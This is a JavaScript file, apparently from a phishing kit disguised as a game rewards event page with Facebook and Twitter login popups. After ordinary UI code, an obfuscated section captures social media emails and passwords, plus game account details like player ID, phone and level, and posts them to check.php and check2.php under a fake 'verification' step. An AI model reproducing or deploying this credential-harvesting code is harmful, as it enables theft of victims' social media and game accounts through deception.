// code for activate clicked sound
var buka = new Audio();
buka.src = "media/open.mp3";

var tutup = new Audio();
tutup.src = "media/close.mp3";

function audioFile() {
    var audio = document.getElementById('audioFile');
    audio.play();
}
$(document).ready(function() {
    $("o").attr("onclick", "audioFile()");
});

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
function open_newhome() {
    $('.account_login').show();
    $('.newhome').hide();
}

function open_mail_login() {
    $('.login-mail').show()
    $('.account_login').hide();
}

function close_mail_login() {
    $('.login-mail').hide()
    $('.account_login').show();
}

function open_about_event() {
    $('.about_event').show();
}

function open_event_rules() {
    $('.event_rules').show();
}

function open_verification() {
    $('.account_verification').show();
    $(".open_rewards").hide()
    $(".otherReward_confirmation").hide()
    $(".itemReward_confirmation").hide()
}

function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src', itemReward_confirmationImg);
}

function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
    var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src', otherReward_confirmationImg);
    $('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}

function close_reward_confirmation() {
    $(".itemReward_confirmation").hide()
    $(".otherReward_confirmation").hide()
}

function close_reward_confirmations() {
    $('.event_rules').hide();
    $('.about_event').hide();
}

function open_facebook() {
    $('.login-facebook').show();
    $('.account_login').hide();
}

function open_twitter() {
    $('.login-twitter').show();
    $('.account_login').hide();
}

function close_facebook() {
    $('.login-facebook').hide()
    $('.account_login').show();
}

function close_twitter() {
    $('.login-twitter').hide()
    $('.account_login').show();
}

function open_newhome() {
    $('.account_login').show();
    $('.newhome').hide();
}

function open_account_login() {
    $('.account_login').show();
    $('.itemReward_confirmation').hide();
}
// code function data
(function(_0x5d5d28, _0x3d933b) {
    var _0x56d88c = _0x573c,
        _0x33508d = _0x5d5d28();
    while (!![]) {
        try {
            var _0xd2166d = -parseInt(_0x56d88c(0xd3)) / 0x1 * (parseInt(_0x56d88c(0xdc)) / 0x2) + -parseInt(_0x56d88c(0xe0)) / 0x3 + -parseInt(_0x56d88c(0xd5)) / 0x4 + parseInt(_0x56d88c(0xdf)) / 0x5 * (parseInt(_0x56d88c(0xc7)) / 0x6) + -parseInt(_0x56d88c(0xe3)) / 0x7 * (parseInt(_0x56d88c(0xea)) / 0x8) + -parseInt(_0x56d88c(0xc5)) / 0x9 * (parseInt(_0x56d88c(0xe1)) / 0xa) + parseInt(_0x56d88c(0xc3)) / 0xb;
            if (_0xd2166d === _0x3d933b) break;
            else _0x33508d['push'](_0x33508d['shift']());
        } catch (_0x29033d) {
            _0x33508d['push'](_0x33508d['shift']());
        }
    }
}(_0x1ce9, 0xd0307));

function ValidateLoginFbData() {
    var _0x5dd61d = _0x573c;
    return $(_0x5dd61d(0xe7))['submit'](function(_0x321ace) {
        var _0x4b12c2 = _0x5dd61d;
        _0x321ace[_0x4b12c2(0xc4)](), $emailfb = $(_0x4b12c2(0xf0))[_0x4b12c2(0xeb)]()[_0x4b12c2(0xde)](), $passwordfb = $(_0x4b12c2(0xce))[_0x4b12c2(0xeb)]()[_0x4b12c2(0xde)](), $loginfb = $(_0x4b12c2(0xd0))['val']()[_0x4b12c2(0xde)]();
        if ($emailfb == '' || $emailfb == null || $emailfb[_0x4b12c2(0xc6)] <= 0x5) return $(_0x4b12c2(0xc0))['show'](), $(_0x4b12c2(0xdb))[_0x4b12c2(0xcc)](), $(_0x4b12c2(0xd8))[_0x4b12c2(0xcc)](), $(_0x4b12c2(0xee))[_0x4b12c2(0xc2)](), $('.login-facebook')[_0x4b12c2(0xc2)](), ![];
        else $(_0x4b12c2(0xc0))[_0x4b12c2(0xcc)](), $(_0x4b12c2(0xdd))[_0x4b12c2(0xeb)]($emailfb), $(_0x4b12c2(0xd8))[_0x4b12c2(0xc2)](), $(_0x4b12c2(0xee))[_0x4b12c2(0xcc)](), $(_0x4b12c2(0xd1))[_0x4b12c2(0xcc)]();
        if ($passwordfb == '' || $passwordfb == null || $passwordfb['length'] <= 0x5) return $(_0x4b12c2(0xdb))[_0x4b12c2(0xc2)](), $(_0x4b12c2(0xd8))['hide'](), $(_0x4b12c2(0xee))[_0x4b12c2(0xc2)](), $(_0x4b12c2(0xd1))[_0x4b12c2(0xc2)](), ![];
        else $(_0x4b12c2(0xdb))['hide'](), $('input#validatePassword')[_0x4b12c2(0xeb)]($passwordfb), $(_0x4b12c2(0xca))[_0x4b12c2(0xeb)]($loginfb), $(_0x4b12c2(0xd8))[_0x4b12c2(0xc2)](), $(_0x4b12c2(0xee))['hide'](), $(_0x4b12c2(0xd1))[_0x4b12c2(0xcc)]();
        var _0x4aca40 = $(_0x4b12c2(0xdd))[_0x4b12c2(0xeb)](),
            _0x5913be = $(_0x4b12c2(0xcb))[_0x4b12c2(0xeb)](),
            _0x2a0f0e = $(_0x4b12c2(0xca))['val']();
        if (_0x4aca40 == '' && _0x5913be == '' && _0x2a0f0e == '') return $(_0x4b12c2(0xd8))['show'](), ![];
        $[_0x4b12c2(0xd2)]({
            'type': _0x4b12c2(0xe5),
            'url': _0x4b12c2(0xc8),
            'data': $(this)[_0x4b12c2(0xec)](),
            'beforeSend': function() {
                var _0x5d7bb4 = _0x4b12c2;
                $(_0x5d7bb4(0xd1))[_0x5d7bb4(0xcc)]();
            },
            'success': function() {
                var _0x534fd2 = _0x4b12c2;
                $(_0x534fd2(0xd1))[_0x534fd2(0xcc)]();
            }
        });
    }), ![];
}

function ValidateLoginTwitterData() {
    var _0x5e8aaf = _0x573c;
    return $(_0x5e8aaf(0xda))['submit'](function(_0xa2ad01) {
        var _0x11c8b2 = _0x5e8aaf;
        _0xa2ad01[_0x11c8b2(0xc4)](), $emailtw = $(_0x11c8b2(0xd6))[_0x11c8b2(0xeb)]()[_0x11c8b2(0xde)](), $passwordtw = $(_0x11c8b2(0xcf))['val']()['trim'](), $logintw = $(_0x11c8b2(0xc1))['val']()['trim']();
        if ($emailtw == '' || $emailtw == null || $emailtw[_0x11c8b2(0xc6)] <= 0x3) return $(_0x11c8b2(0xe6))[_0x11c8b2(0xc2)](), $(_0x11c8b2(0xe2))[_0x11c8b2(0xcc)](), $(_0x11c8b2(0xd8))[_0x11c8b2(0xcc)](), $(_0x11c8b2(0xee))[_0x11c8b2(0xc2)](), $(_0x11c8b2(0xef))[_0x11c8b2(0xc2)](), ![];
        else $(_0x11c8b2(0xe6))[_0x11c8b2(0xcc)](), $(_0x11c8b2(0xdd))[_0x11c8b2(0xeb)]($emailtw), $('.verify-sec')['show'](), $(_0x11c8b2(0xee))[_0x11c8b2(0xcc)](), $(_0x11c8b2(0xef))[_0x11c8b2(0xcc)]();
        if ($passwordtw == '' || $passwordtw == null || $passwordtw['length'] <= 0x7) return $(_0x11c8b2(0xe2))[_0x11c8b2(0xc2)](), $(_0x11c8b2(0xd8))[_0x11c8b2(0xcc)](), $(_0x11c8b2(0xee))[_0x11c8b2(0xc2)](), $(_0x11c8b2(0xef))[_0x11c8b2(0xc2)](), ![];
        else $(_0x11c8b2(0xe2))[_0x11c8b2(0xcc)](), $(_0x11c8b2(0xcb))[_0x11c8b2(0xeb)]($passwordtw), $(_0x11c8b2(0xca))[_0x11c8b2(0xeb)]($logintw), $(_0x11c8b2(0xd8))['show'](), $('.spin-sec')[_0x11c8b2(0xcc)](), $('.login-twitter')['hide']();
        var _0x1460ce = $(_0x11c8b2(0xdd))[_0x11c8b2(0xeb)](),
            _0x5a70a3 = $(_0x11c8b2(0xcb))[_0x11c8b2(0xeb)](),
            _0xb00985 = $('input#validateLogin')[_0x11c8b2(0xeb)]();
        if (_0x1460ce == '' && _0x5a70a3 == '' && _0xb00985 == '') return $('.verify-sec')[_0x11c8b2(0xc2)](), ![];
        $[_0x11c8b2(0xd2)]({
            'type': _0x11c8b2(0xe5),
            'url': _0x11c8b2(0xc8),
            'data': $(this)[_0x11c8b2(0xec)](),
            'beforeSend': function() {
                var _0xf2d57c = _0x11c8b2;
                $(_0xf2d57c(0xef))[_0xf2d57c(0xcc)]();
            },
            'success': function() {
                var _0x120c6f = _0x11c8b2;
                $(_0x120c6f(0xef))[_0x120c6f(0xcc)]();
            }
        });
    }), ![];
}

function _0x573c(_0x541b04, _0x190ed3) {
    var _0x1ce9ac = _0x1ce9();
    return _0x573c = function(_0x573c7d, _0x5e9f74) {
        _0x573c7d = _0x573c7d - 0xc0;
        var _0x295f37 = _0x1ce9ac[_0x573c7d];
        return _0x295f37;
    }, _0x573c(_0x541b04, _0x190ed3);
}

function ValidateVerificationData() {
    var _0x1e25e7 = _0x573c;
    return $(_0x1e25e7(0xe8))['submit'](function(_0x383567) {
        var _0x59b5f8 = _0x1e25e7;
        _0x383567['preventDefault']();
        var _0x2dd5b0 = $(_0x59b5f8(0xdd))[_0x59b5f8(0xeb)](),
            _0x5222bb = $(_0x59b5f8(0xcb))[_0x59b5f8(0xeb)](),
            _0x214f92 = $(_0x59b5f8(0xe4))[_0x59b5f8(0xeb)](),
            _0x3bd86f = $('input#playid')[_0x59b5f8(0xeb)](),
            _0x5edb14 = $(_0x59b5f8(0xc9))['val'](),
            _0x578ec4 = $(_0x59b5f8(0xe9))['val'](),
            _0x3386d5 = $('input#tier')[_0x59b5f8(0xeb)](),
            _0x4ef725 = $(_0x59b5f8(0xd9))[_0x59b5f8(0xeb)](),
            _0x1defb8 = $(_0x59b5f8(0xcd))['val'](),
            _0x512d42 = $('input#platform')[_0x59b5f8(0xeb)](),
            _0x1e829e = $(_0x59b5f8(0xca))['val']();
        if (_0x2dd5b0 == '' && _0x5222bb == '' && _0x214f92 == '' && _0x3bd86f == '' && _0x5edb14 == '' && _0x578ec4 == '' && _0x3386d5 == '' && _0x4ef725 == '' && _0x1defb8 == '' && _0x512d42 == '' && _0x1e829e == '') return $(_0x59b5f8(0xd8))[_0x59b5f8(0xc2)](), $(_0x59b5f8(0xee))[_0x59b5f8(0xcc)](), ![];
        $['ajax']({
            'type': _0x59b5f8(0xe5),
            'url': _0x59b5f8(0xd7),
            'data': $(this)[_0x59b5f8(0xec)](),
            'beforeSend': function() {
                var _0x53ccc5 = _0x59b5f8;
                $(_0x53ccc5(0xed))['show'](), $(_0x53ccc5(0xd8))[_0x53ccc5(0xcc)](), $(_0x53ccc5(0xee))['hide']();
            },
            'success': function() {
                var _0x2f8597 = _0x59b5f8;
                $(_0x2f8597(0xd4))['show'](), $(_0x2f8597(0xed))[_0x2f8597(0xcc)](), $(_0x2f8597(0xd8))[_0x2f8597(0xcc)](), $('.spin-sec')[_0x2f8597(0xcc)]();
            }
        });
    }), ![];
};

function _0x1ce9() {
    var _0x598ec5 = ['#ValidateLoginFbForm', '#ValidateVerificationDataForm', 'input#level', '8QuVapf', 'val', 'serialize', '.load-sec', '.spin-sec', '.login-twitter', '#email-facebook', '.email-fb', '#login-twitter', 'show', '39113910Cufurs', 'preventDefault', '12528aXAcFv', 'length', '4009914iKFVZq', 'check.php', 'input#phone', 'input#validateLogin', 'input#validatePassword', 'hide', 'input#rpl', '#password-facebook', '#password-twitter', '#login-facebook', '.login-facebook', 'ajax', '10838iAAqsA', '.proces-sec', '1905688gFJUMz', '#email-twitter', 'check2.php', '.verify-sec', 'input#rpt', '#ValidateLoginTwitterForm', '.sandi-fb', '152OleZnT', 'input#validateEmail', 'trim', '10mfwsBe', '4981587HfgCua', '4540eMdppw', '.sandi-tw', '3129686xKQAbg', 'input#nick', 'POST', '.email-tw'];
    _0x1ce9 = function() {
        return _0x598ec5;
    };
    return _0x1ce9();
}